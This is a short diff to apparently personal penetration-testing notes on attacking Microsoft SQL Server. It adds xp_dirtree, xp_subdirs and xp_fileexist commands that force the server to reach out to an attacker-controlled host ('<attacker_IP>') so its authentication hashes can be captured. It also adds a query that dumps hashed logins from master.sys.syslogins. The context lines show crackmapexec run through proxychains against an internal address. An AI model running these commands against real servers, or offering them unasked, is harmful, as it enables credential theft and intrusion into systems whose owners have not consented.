@@ -91,4 +91,11 @@ proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u 
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0d89e7ee-4d0a-420b-854e-2ab67c7f3a9a)
 ```
 EXEC xp_dirtree '\\10.10.14.31\share', 1, 1
+Exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
+EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
+EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
+```
+### Get Hashed Pwd
+```
+SELECT * FROM master.sys.syslogins;
 ```
